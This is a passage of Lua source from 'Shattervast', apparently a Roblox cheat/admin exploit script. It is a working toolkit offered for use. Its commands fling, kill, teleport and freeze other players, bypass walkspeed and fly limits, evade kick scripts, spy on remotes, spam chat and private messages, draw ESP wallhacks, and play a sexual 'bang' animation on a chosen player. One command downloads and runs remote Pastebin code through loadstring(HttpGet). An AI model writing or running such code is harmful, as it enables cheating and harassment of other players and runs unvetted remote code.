  LP.Character.HumanoidRootPart.CFrame = gsPlayers[trlplr.Name].Character.HumanoidRootPart.CFrame + gsPlayers[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * trlnum
 end
 if annoying then
  LP.Character.HumanoidRootPart.CFrame = gsPlayers[annplr.Name].Character.HumanoidRootPart.CFrame
 end
 if walkto then
  LP.Character.Humanoid:MoveTo(walkplr.Character.HumanoidRootPart.Position)
 end
 if cbringing then
  CBRINGplr.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * CBRINGamount
 end
 if cbringingall then
  for i,getbringplrs in pairs(gsPlayers:GetPlayers()) do
   if getbringplrs ~= LP then
    getbringplrs.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * CBRINGamount
   end
  end
 end
 if staring then
  LP.Character.HumanoidRootPart.CFrame = CFrame.new(LP.Character.Torso.Position, gsPlayers[stareplr.Name].Character.Torso.Position)
 end
 if stopsitting then
  LP.Character.Humanoid.Sit = false
 end
 if looptpbypassfly then
  pcall(function()
   LP.Character.Head.Anchored = false
   LP.Character.HumanoidRootPart.CFrame = gsWorkspace.rGETpartNUMBER2.CFrame
   LP.Character.Head.Anchored = true
  end)
 end
 if loopview then
  view(viewplr)
 end
 if cmdForward then
  LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * forwardSpeed
 end
 if loopviewfc then
  pcall(function()
   gsWorkspace.CurrentCamera.CameraSubject = gsWorkspace.rGETpartNUMBER2
  end)
 end
 if spinTOhead then
  pcall(function()
   spinObj.Position = LP.Character.Head.Position
  end)
 end
 if rideACTIVE == true then
  LP.character.HumanoidRootPart.CFrame = ridePLAYER.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
 end
end)
spawningatreset = false
spawnresetpoint = LP.Character.Head.CFrame

LPcurrenthumanoid.Died:Connect(function()
 flying = false
 doFREECAM = false
 if savingtoolsloop then
  run(commandPrefix.."savealltool")
 end
 if spawningatreset == true then
  spawnresetpoint = LP.Character.Head.CFrame + Vector3.new(0, 5, 0)
 end
end)

LP.CharacterAdded:Connect(function()
 wait(0.2)
 LP.Character.Humanoid.WalkSpeed = spawnWS
 LP.Character.Humanoid.JumpPower = spawnJP
 LP.Character.Humanoid.HipHeight = spawnHH
 if spawningfegod then
  FEGodmode()
 end
 if spawningpos and spawnpos ~= nil then
  LP.Character.HumanoidRootPart.CFrame = spawnpos
 end
 if spawningatreset == true then
  LP.Character.HumanoidRootPart.CFrame = spawnresetpoint
 end
end)

-- Commands
Commands = {}

Commands.print = function(args)
 local msg = table.concat(args," ")
 print(msg)
end

Commands.warn = function(args)
 local msg = table.concat(args," ")
 warn(msg)
end

Commands.sit = function(args)
 LP.Character.Humanoid.Sit = true
end

Commands.god = function(args)
 FEGodmode()
 Notification("warning", "You have enabled FE Godmode, tools will not work. Use "..commandPrefix.."grespawn to remove.", 7)
end

Commands.view = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   if bypassMODE == false then
    view(v)
    Notification("info", "Now viewing "..v.Name..". Use "..commandPrefix.."unview to stop viewing.", 3)
   elseif bypassMODE == true then
    viewplr = v
    loopview = true
   end
  end
 end
end

Commands.unview = function(args)
 view(LP)
 loopview = false
end

Commands.gravity = function(args)
 if args[1] then
  gsWorkspace.Gravity = args[1]
 end
end

Commands.ungravity = function(args)
 gsWorkspace.Gravity = CurrentGravity
end

Commands.goto = function(args)
 if args[1] then
  if bypassMODE == false then
   for i,v in pairs(findPlayer(args[1])) do
    LP.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
   end
  elseif bypassMODE == true then
   for i,v in pairs(findPlayer(args[1])) do
    local TPbypass = {}
    TPbypass.CFrame = v.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
    local TPFunction = gsTween:Create(LP.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), TPbypass)
    TPFunction:Play()
   end
  end
 end
end

Commands.fecheck = function(args)
 if gsWorkspace.FilteringEnabled == true then
  Notification("warning", "FE is enabled!", 7)
 else
  Notification("warning", "FE is disabled. Consider using a different script.", 7)
 end
end

Commands.lockws = function(args)
 lockWS()
 Notification("info", "Workspace locked.", 4)
end

Commands.unlockws = function(args)
 unlockWS()
 Notification("info", "Workspace unlocked.", 4)
end

Commands.noclip = function(args)
 noclip = true
 Notification("info", "Noclip enabled.", 4)
end

Commands.clip = function(args)
 noclip = false
 Notification("info", "Noclip disabled.", 4)
end

Commands.follow = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   flwplr = v
  end
  if args[2] then
   flwnum = args[2]
  else
   flwnum = -5
  end
  following = true
 else
  Notification("warning", "No player selected to follow! Use: "..commandPrefix.."follow player", 4)
 end
end

Commands.unfollow = function(args)
 following = false
end

Commands.fling = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   if v ~= LP then
    view(v)
    pcall(function()
     LP.Character.HumanoidRootPart.Fling:Destroy()
    end)
    if not args[2] then
     RocketPropulsion(800000,1000,400000,v,"Fling")
    else
     RocketPropulsion(args[2],1500,400000,v,"Fling")
    end
    if noclip ~= true then
     flingnoclip = true
     noclip = true
    end
   end
  end
 else
  Notification("warning", "No player selected to fling! Use: "..commandPrefix.."fling player", 4)
 end
end

Commands.unfling = function(args)
 view(LP)
 pcall(function()
  if LP.Character.HumanoidRootPart.Fling then
   for i,v in pairs(LP.Character:GetDescendants()) do
    if v.Name == "Fling" and v:IsA("RocketPropulsion") then
     v:Destroy()
    end
   end
  end
 end)
 if flingnoclip == true then
  noclip = false
  flingnoclip = false
 end
end

Commands.trail = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   trlplr = v
  end
  if args[2] then
   trlnum = args[2]
  else
   trlnum = 5
  end
  trailing = true
 else
  Notification("warning", "No player selected to trail! Use: "..commandPrefix.."trail player", 4)
 end
end

Commands.untrail = function(args)
 trailing = false
end

Commands.annoy = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   annplr = v
  end
  annoying = true
 else
  Notification("warning", "No player selected to annoy! Use: "..commandPrefix.."annoy player", 4)
 end
end

Commands.unannoy = function(args)
 annoying = false
end

Commands.reset = function(args)
 LP.Character:BreakJoints()
end

Commands.grespawn = function(args)
 LP.Character.Humanoid.Health = 0
 wait(1)
 LP.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
 LP.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
end

Commands.respawn = function(args)
 local mod = Instance.new('Model', workspace) mod.Name = 'new '..LP.Name
 local hum = Instance.new('Humanoid', mod)
 local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
 LP.Character = mod
end

Commands.speed = function(args)
 if args[1] then
  run(commandPrefix.."ws "..args[1])
 end
end

bypassingwalkspeed = false
Commands.ws = function(args)
 if args[1] then
  if bypassMODE == false then
   LP.Character.Humanoid.WalkSpeed = args[1]
  elseif bypassMODE == true then
   if game.GameId == 245662005 then
    bypassingwalkspeed = true
    bypassWalkspeed = args[1]
   end
  end
 end
end

game:GetService("RunService").Heartbeat:Connect(function()
 if bypassingwalkspeed then
  LP.Character.Humanoid.WalkSpeed = bypassWalkspeed
 end
end)

Commands.jumppower = function(args)
 if args[1] then
  LP.Character.Humanoid.JumpPower = args[1]
 end
end

Commands.jp = function(args)
 if args[1] then
  LP.Character.Humanoid.JumpPower = args[1]
 end
end

Commands.hipheight = function(args)
 if args[1] then
  LP.Character.Humanoid.HipHeight = args[1]
 end
end

Commands.hh = function(args)
 if args[1] then
  LP.Character.Humanoid.HipHeight = args[1]
 end
end

Commands.default = function(args)
 LP.Character.Humanoid.WalkSpeed = CurrentWalkspeed
 LP.Character.Humanoid.HipHeight = CurrentHipheight
 LP.Character.Humanoid.JumpPower = CurrentJumppower
end

Commands.credits = function(args)
 Notification("info", "Shattervast was made by illremember#3799 , "..commandPrefix.."fullcredits for all credits.", 8)
end

Commands.attach = function(args)
 if hasTools() == false then
  Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
 else
  FEGodmode()
  for i,v in pairs(LP.Backpack:GetChildren())do
   LP.Character.Humanoid:EquipTool(v)
  end
  if args[1] then
   for i,v in pairs(findSinglePlayer(args[1])) do
    if v ~= LP then
     LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
     wait(0.3)
     LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
    end
   end
  end
 end
end

Commands.fly = function(args)
 if bypassMODE == false then
  local speedget = 1
  repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('HumanoidRootPart') and LP.Character:FindFirstChild('Humanoid')
  repeat wait() until Mouse
  if args[1] then
   speedfly = args[1]
  else
   speedfly = 1
  end
  
  local T = LP.Character.HumanoidRootPart
  local CONTROL = {F = 0, B = 0, L = 0, R = 0}
  local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
  local SPEED = speedget
  
  local function fly()
   flying = true
   local BG = Instance.new('BodyGyro', T)
   local BV = Instance.new('BodyVelocity', T)
   BG.P = 9e4
   BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
   BG.cframe = T.CFrame
   BV.velocity = Vector3.new(0, 0.1, 0)
   BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
   spawn(function()
   repeat wait()
   LP.Character.Humanoid.PlatformStand = true
   if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
   SPEED = 50
   elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
   SPEED = 0
   end
   if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
   BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
   lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
   elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
   BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
   else
   BV.velocity = Vector3.new(0, 0.1, 0)
   end
   BG.cframe = workspace.CurrentCamera.CoordinateFrame
     until not flying
     CONTROL = {F = 0, B = 0, L = 0, R = 0}
     lCONTROL = {F = 0, B = 0, L = 0, R = 0}
     SPEED = 0
     BG:destroy()
     BV:destroy()
     LP.Character.Humanoid.PlatformStand = false
    end)
   end
  Mouse.KeyDown:connect(function(KEY)
   if KEY:lower() == 'w' then
    CONTROL.F = speedfly
   elseif KEY:lower() == 's' then
    CONTROL.B = -speedfly
   elseif KEY:lower() == 'a' then
    CONTROL.L = -speedfly 
   elseif KEY:lower() == 'd' then 
    CONTROL.R = speedfly
   end
  end)
  Mouse.KeyUp:connect(function(KEY)
   if KEY:lower() == 'w' then
    CONTROL.F = 0
   elseif KEY:lower() == 's' then
    CONTROL.B = 0
   elseif KEY:lower() == 'a' then
    CONTROL.L = 0
   elseif KEY:lower() == 'd' then
    CONTROL.R = 0
   end
  end)
  fly()
 elseif bypassMODE == true then
  if not args[1] then
   run(commandPrefix.."fc")
  else
   run(commandPrefix.."fc "..args[1])
  end
  LP.Character.Head.Anchored = false
  looptpbypassfly = true
  view(LP)
 end
end

Commands.unfly = function(args)
 if bypassMODE == false then
  flying = false
  LP.Character.Humanoid.PlatformStand = false
 else
  looptpbypassfly = false
  run(commandPrefix.."unfreecam")
  local goalTP = LP.Character.HumanoidRootPart.CFrame
  if game.GameId == 245662005 then
   for i = 1, 5 do wait(0.2)
    LP.Character.HumanoidRootPart.CFrame = goalTP
   end
  else
   LP.Character.HumanoidRootPart.CFrame = goalTP
  end
  LP.Character.Head.Anchored = false
 end
end

Commands.kill = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   if v == LP then
    LP.Character:BreakJoints()
   else
    if hasTools() == false then
     Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
    else
     FEGodmode()
     for i,v in pairs(LP.Backpack:GetChildren())do
      LP.Character.Humanoid:EquipTool(v)
     end
     local NOW = LP.Character.HumanoidRootPart.CFrame
     LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
     wait(0.3)
     LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
     local function tp(player,player2)
     local char1,char2=player.Character,player2.Character
     if char1 and char2 then
     char1:MoveTo(char2.Head.Position)
     end
     end
     wait(0.5)
     LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(100000,0,100000))
     wait(0.5)
     tp(LP,game:GetService("Players")[v.Name])
     wait(0.7)
     LP.Character.HumanoidRootPart.CFrame = NOW
     view(LP)
    end
   end
  end
 end
end
Commands.bring = function(args)
 if hasTools() == false then
  Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
 else
  FEGodmode()
  for i,v in pairs(LP.Backpack:GetChildren())do
   LP.Character.Humanoid:EquipTool(v)
  end
  if args[1] then
   for i,v in pairs(findSinglePlayer(args[1])) do
    if v ~= LP then
     local NOW = LP.Character.HumanoidRootPart.CFrame
     local function tp(player,player2)
     local char1,char2=player.Character,player2.Character
     if char1 and char2 then
     char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
     end
     end
     local function getout(player,player2)
     local char1,char2=player.Character,player2.Character
     if char1 and char2 then
     char1:MoveTo(char2.Head.Position)
     end
     end
     tp(game:GetService("Players")[v.Name], LP)
     wait(0.2)
     tp(game:GetService("Players")[v.Name], LP)
     wait(0.5)
     LP.Character.HumanoidRootPart.CFrame = NOW
     wait(0.5)
     getout(LP, game:GetService("Players")[v.Name])
     wait(0.3)
     LP.Character.HumanoidRootPart.CFrame = NOW
    end
   end
  end
 end
end

Commands.naked = function(args)
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Clothing") then
   v:Destroy()
  end
 end
end

Commands.nolimbs = function(args)
 LP.Character["Left Arm"]:Destroy()
 LP.Character["Right Arm"]:Destroy()
 LP.Character["Left Leg"]:Destroy()
 LP.Character["Right Leg"]:Destroy()
end

Commands.noarms = function(args)
 LP.Character["Left Arm"]:Destroy()
 LP.Character["Right Arm"]:Destroy()
end

Commands.nolegs = function(args)
 LP.Character["Left Leg"]:Destroy()
 LP.Character["Right Leg"]:Destroy()
end

Commands.headless = function(args)
 local l = LP.Character.Humanoid:Clone()
 LP.Character.Humanoid:Destroy()
 wait(0.2)
 LP.Character.Head.CanCollide = false
 for i,v in pairs(LP.Character:GetDescendants()) do
  if string.sub(v.Name, 1, 4) == "Neck" then
   v:Destroy()
  end
 end
 wait(0.2)
 l.Name = "Humanoid"
 l.Parent = LP.Character
 wait(0.1)
 game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character
 LP.Character.Animate:Destroy()
end

antiremotes = false
Commands.antikick = function(args)
 if args[1] then
  if args[1] == "on" then
   antiremotes = true
   wait(0.2)
   for i,v in pairs(LP.Character:GetChildren()) do
    if string.find(string.lower(v.Name), "exploit") and v:IsA("LocalScript") then
     v.Disabled = true
    end
   end
   Notification("warning", "This command disables all remotes incase they are kick remotes, may break game.", 8)
   Notification("info", "Does not prevent serverside kicks, use "..commandPrefix.."antikick off to turn off.", 8)
  elseif args[1] == "off" then
   antiremotes = false
   Notification("warning", "Remote anti-kick turned off.", 8)
  end
 end
end

blockedremotes = {}
Commands.blockremote = function(args)
 local getService = ""
 if args[1] then
  local remoteName = string.lower(tostring(args[1]))
  if args[2] then
   local serviceRemote = string.lower(tostring(args[2]))
   if serviceRemote == "workspace" then
    getService = "Workspace"
   elseif serviceRemote == "replicatedstorage" then
    getService = "ReplicatedStorage"
   elseif serviceRemote == "players" then
    getService = "Players"
   elseif serviceRemote == "lighting" then
    getService = "Lighting"
   elseif serviceRemote == "startergui" then
    getService = "StarterGui"
   elseif serviceRemote == "starterpack" then
    getService = "StarterPack"
   elseif serviceRemote == "starterplayer" then
    getService = "StarterPlayer"
   else
    getService = "ReplicatedStorage"
   end
  else
   getService = "ReplicatedStorage"
  end
  for i,getRemote in pairs(game:GetService(getService):GetDescendants()) do
   if string.lower(getRemote.Name) == remoteName then
    table.insert(blockedremotes, getRemote.Name)
   end
  end
 end
 Notification("warning", "If this command does not work, make sure you type remote name/service fully correct.", 8)
end

spyingremotes = false
Commands.remotespy = function(args)
 if args[1] then
  if args[1] == "on" then
   spyingremotes = true
   Notification("info", "Remotespy turned on.", 4)
  elseif args[1] == "off" then
   spyingremotes = false
   Notification("info", "Remotespy turned off.", 4)
  end
 end
end

Commands.bang = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   if v ~= nil then
    following = true
    flwplr = v
    flwnum = -1
    local bangAnimation = Instance.new("Animation")
    bangAnimation.AnimationId = "rbxassetid://148840371"
    bangTrack = LP.Character.Humanoid:LoadAnimation(bangAnimation)
    if args[2] then
     bangTrack:Play(.1, 1, args[2])
    else
     bangTrack:Play(.1, 1, 1)
    end
   end
  end
 else
  Notification("warning", "No player selected to follow! Use: "..commandPrefix.."follow player", 4)
 end
end

Commands.unbang = function(args)
 following = false
 bangTrack:Stop()
end

spamdelay = 1
spamtext = "Spam"
spamming = false
Commands.spam = function(args)
 if args[1] then
  spamtext = args[1]
  spamming = true
 end
end
Commands.spamdelay = function(args)
 if args[1] then
  spamdelay = args[1]
 end
end
spawn(function()
 while wait(spamdelay) do
  if spamming then
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
  end
 end
end)

Commands.unspam = function(args)
 spamming = false
end

Commands.info = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   createINFO(v)
  end
 end
end

Commands.age = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." Account Age: "..v.AccountAge.." days!", "All")
  end
 end
end

Commands.invisible = function(args)
 local Character = LP.Character
 if LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
  local Clone = Character.HumanoidRootPart:Clone()
  Character.HumanoidRootPart:Destroy()
  Clone.Parent = Character
 else
  local Clone = Character.LowerTorso.Root:Clone()
  Character.LowerTorso.Root:Destroy()
  Clone.Parent = Character.LowerTorso
 end
end

walkto = false
walkplr = ""
Commands.walk = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   walkplr = v
   walkto = true
   noclip = true
  end
 end
end

Commands.unwalk = function(args)
 walkto = false
 noclip = false
 LP.Character.Humanoid:MoveTo(LP.Character.HumanoidRootPart.Position)
end

Commands.glitch = function(args)
 if hasTools() == false then
  Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
 else
  FEGodmode()
  for i,v in pairs(LP.Backpack:GetChildren())do
   LP.Character.Humanoid:EquipTool(v)
  end
  if args[1] then
   for i,v in pairs(findSinglePlayer(args[1])) do
    local function tp(player,player2)
    local char1,char2=player.Character,player2.Character
    if char1 and char2 then
    char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
    end
    end
    tp(game:GetService("Players")[v.Name], LP)
    wait(0.2)
    tp(game:GetService("Players")[v.Name], LP)
    wait(0.5)
    local b = Instance.new("BodyForce")
    b.Parent = LP.Character.HumanoidRootPart
    b.Name = "Glitch"
    if args[2] then
     b.Force = Vector3.new(args[2],5000,0)
    else
     b.Force = Vector3.new(100000000,5000,0)
    end
    wait(6)
    b:Destroy()
   end
  end
 end
end

Commands.tp = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   if v == LP then
    if args[2] then
     for i,a in pairs(findSinglePlayer(args[2])) do
      v.Character.HumanoidRootPart.CFrame = a.Character.HumanoidRootPart.CFrame
     end
    end
   else
    if hasTools() == false then
     Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
    else
     FEGodmode()
     for i,v in pairs(LP.Backpack:GetChildren())do
      LP.Character.Humanoid:EquipTool(v)
     end
     if args[1] then
      for i,first in pairs(findSinglePlayer(args[1])) do
       if args[2] then
        for i,second in pairs(findSinglePlayer(args[2])) do
         local function tp(player,player2)
         local char1,char2=player.Character,player2.Character
         if char1 and char2 then
         char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
         end
         end
         local function getout(player,player2)
         local char1,char2=player.Character,player2.Character
         if char1 and char2 then
         char1:MoveTo(char2.Head.Position)
         end
         end
         tp(LP, first)
         wait(0.2)
         tp(LP, first)
         wait(0.5)
         tp(LP, second)
         wait(0.2)
         tp(LP, second)
         wait(0.2)
         getout(LP, first)
        end
       end
      end
     end
    end
   end
  end
 end
end

Commands.givetool = function(args)
 if args[1] then
  if args[2] then
   local selectedTool = ""
   for i,allTools in pairs(LP.Character:GetDescendants()) do
    if allTools:IsA("Tool") and string.lower(allTools.Name) == string.lower(args[2]) then
     selectedTool = allTools
    else
     for i,otherTools in pairs(LP.Backpack:GetDescendants()) do
      if otherTools:IsA("Tool") and string.lower(otherTools.Name) == string.lower(args[2]) then
       selectedTool = otherTools
      end
     end
    end
   end
   for i,v in pairs(findSinglePlayer(args[1])) do
    if selectedTool ~= "" then
     selectedTool.Parent = v.Character
    end
   end
  else
   for i,plr in pairs(findSinglePlayer(args[1])) do
    for i,tool in pairs(LP.Character:GetDescendants()) do
     if tool:IsA("Tool") then
      tool.Parent = plr.Character
     end
    end
   end
  end
 end
end

Commands.givealltools = function(args)
 LP.Character.Humanoid:UnequipTools()
 for i,plr in pairs(findSinglePlayer(args[1])) do
  for i,v in pairs(LP.Character:GetDescendants()) do
   if v:IsA("Tool") then
    v.Parent = plr.Character
   end
  end
  for i,a in pairs(LP.Backpack:GetDescendants()) do
   if a:IsA("Tool") then
    a.Parent = plr.Character
   end
  end
 end
end

Commands.blockhats = function(args)
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Accessory") or v:IsA("Hat") then
   for i,mesh in pairs(v:GetDescendants()) do
    if mesh.Name == "Mesh" then
     mesh:Destroy()
    end
   end
  end
 end
end

Commands.blocktool = function(args)
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Tool") then
   for i,mesh in pairs(v:GetDescendants()) do
    if mesh.Name == "Mesh" then
     mesh:Destroy()
    end
   end
  end
 end
end

Commands.orbit = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   view(v)
   RocketPropulsion(5000,100,5000,v,"OrbitMove")
  end
 else
  Notification("warning", "No player selected to orbit! Use: "..commandPrefix.."orbit player", 4)
 end
end

Commands.unorbit = function(args)
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v.Name == "OrbitMove" then
   v:Destroy()
  end
 end
 view(LP)
end

Commands.pos = function(args)
 Notification("info", "Your current position is ".. tostring(LP.Character.HumanoidRootPart.Position), 9)
end

SavedPosition = ""
Commands.savepos = function(args)
 SavedPosition = LP.Character.HumanoidRootPart.CFrame
end
Commands.loadpos = function(args)
 if SavedPosition ~= "" then
  LP.Character.HumanoidRootPart.CFrame = SavedPosition
 end
end

Commands.tppos = function(args)
 if args[1] and args[2] and args[3] then
  LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(args[1], args[2], args[3]))
 end
end

Commands.pmspam = function(args)
 if args[1] then
  local gotPlayer = ""
  for i,v in pairs(findPlayer(args[1])) do
   gotPlayer = v
  end
  table.remove(args, 1)
  local pmSpamMsg = table.concat(args," ")
  spamtext = "/w "..gotPlayer.Name.." "..pmSpamMsg
  spamming = true
 end
end

Commands.unpmspam = function(args)
 spamming = false
end

Commands.wsvis = function(args)
 if args[1] then
  for i,v in pairs(gsWorkspace:GetDescendants()) do
   if v:IsA("Part") or v:IsA("Decal") then
    if tonumber(args[1]) > 1 then
     v.Transparency = 0.5
    else
     v.Transparency = args[1]
    end
   end
  end
 end
 clientSided()
end

Commands.bringobj = function(args)
 if args[1] then
  local Object = ""
  for i,v in pairs(gsWorkspace:GetDescendants()) do
   if string.lower(v.Name) == string.lower(args[1]) then
    Object = v    
   end
  end
  if Object == "" then
   Notification("warning", "Object was not found in the workspace.", 6)
  end
  if args[2] then
   Object.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * args[2]
  else
   Object.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 3
  end
  clientSided()
 end
end

CBRINGplr = ""
cbringing = false
cbringingall = false
Commands.cbring = function(args)
 if args[1] then
  if string.lower(tostring(args[1])) == "all" or string.lower(tostring(args[1])) == "others" then
   cbringingall = true
  else
   for i,v in pairs(findPlayer(args[1])) do
    CBRINGplr = v
    cbringing = true
   end
  end
  if args[2] then
   CBRINGamount = args[2]
  else
   CBRINGamount = 3
  end
  clientSided()
 end
end

Commands.uncbring = function(args)
 cbringing = false
 cbringingall = false
end

Commands.cfreeze = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   v.Character.HumanoidRootPart.Anchored = true
  end
  clientSided()
 end
end

Commands.uncfreeze = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   v.Character.HumanoidRootPart.Anchored = false
  end
 else
  for i,all in pairs(gsPlayers:GetPlayers()) do
   all.Character.HumanoidRootPart.Anchored = false
  end
 end
end

Commands.unattach = function(args)
 local function getout(player,player2)
 local char1,char2=player.Character,player2.Character
 if char1 and char2 then
 char1:MoveTo(char2.Head.Position)
 end
 end
 getout(LP, LP)
end

currentToolSize = ""
Commands.reach = function(args)
 if args[1] then
  for i,v in pairs(LP.Character:GetDescendants()) do
   if v:IsA("Tool") then
    if string.lower(tostring(args[1])) == "off" then
     v.Handle.Size = currentToolSize
     v.Handle.SelectionBoxCreated:Destroy()
     LP.Character.Humanoid:UnequipTools()
    elseif string.lower(tostring(args[1])) == "on" then
     if args[2] then
      currentToolSize = v.Handle.Size
      local a = Instance.new("SelectionBox",v.Handle)
      a.Name = "SelectionBoxCreated"
      a.Adornee = v.Handle
      v.Handle.Size = Vector3.new(0.5,0.5,args[2])
      v.GripPos = Vector3.new(0,0,0)
      LP.Character.Humanoid:UnequipTools()
     else
      currentToolSize = v.Handle.Size
      local a = Instance.new("SelectionBox",v.Handle)
      a.Name = "SelectionBoxCreated"
      a.Adornee = v.Handle
      v.Handle.Size = Vector3.new(0.5,0.5,60)
      v.GripPos = Vector3.new(0,0,0)
      LP.Character.Humanoid:UnequipTools()
     end
    end
   end
  end
 end
end

Commands.droptool = function(args)
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Tool") then
   v.Parent = gsWorkspace
  end
 end
 for i,a in pairs(LP.Backpack:GetDescendants()) do
  if a:IsA("Tool") then
   a.Parent = gsWorkspace
  end
 end
end

Commands.drophats = function(args)
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Accessory") or v:IsA("Hat") then
   v.Parent = gsWorkspace
  end
 end
end

Commands.hidecmdbar = function(args)
 CMDBAR.Visible = false
end

Commands.showcmdbar = function(args)
 CMDBAR.Visible = true
end

Commands.prefix = function(args)
 if args[1] then
  commandPrefix = string.sub(tostring(args[1]), 1, 1)
  fullUpdate()
 end
end

Commands.removeinvis = function(args)
 for i,v in pairs(gsWorkspace:GetDescendants()) do
  if v:IsA("Part") and v.Name ~= "HumanoidRootPart" then
   if v.Transparency == 1 then
    v:Destroy()
   end
  end
 end
 clientSided()
end

Commands.removefog = function(args)
 gsLighting.FogStart = 0
 gsLighting.FogEnd = 9999999999999
 clientSided()
end

Commands.animation = function(args)
 if args[1] then
  if string.lower(tostring(args[1])) == "gui" then
   loadstring(game:HttpGet(("https://pastebin.com/raw/mdbTSP4d"),true))()
  else
   local Anim = Instance.new("Animation")
   Anim.AnimationId = "rbxassetid://".. tostring(args[1])
   local track = LP.Character.Humanoid:LoadAnimation(Anim)
   if args[2] then
    track:Play(.1, 1, args[2])
   else
    track:Play(.1, 1, 1)
   end
  end
 end
end

Commands.btools = function(args)
 local Clone_T = Instance.new("HopperBin",LP.Backpack)
 Clone_T.BinType = "Clone"
 local Destruct = Instance.new("HopperBin",LP.Backpack)
 Destruct.BinType = "Hammer"
 local Hold_T = Instance.new("HopperBin",LP.Backpack)
 Hold_T.BinType = "Grab"
 clientSided()
end

Commands.esp = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   local espPlayer = v
   for i,createESP in pairs(espPlayer.Character:GetDescendants()) do
    if createESP:IsA("Part") or createESP:IsA("MeshPart") then
     if createESP.Name ~= "HumanoidRootPart" and createESP.Name ~= "Handle" then
      local current = true
      local espBOX = Instance.new("BoxHandleAdornment")
      espBOX.Parent = game.Players.LocalPlayer.PlayerGui
      espBOX.Name = "rGET"..espPlayer.Name
      espBOX.Adornee = createESP
      espBOX.AlwaysOnTop = true
      espBOX.ZIndex = 0
      espBOX.Size = createESP.Size
      espBOX.Transparency = 0.3
      local AboveHead = Instance.new("BillboardGui")
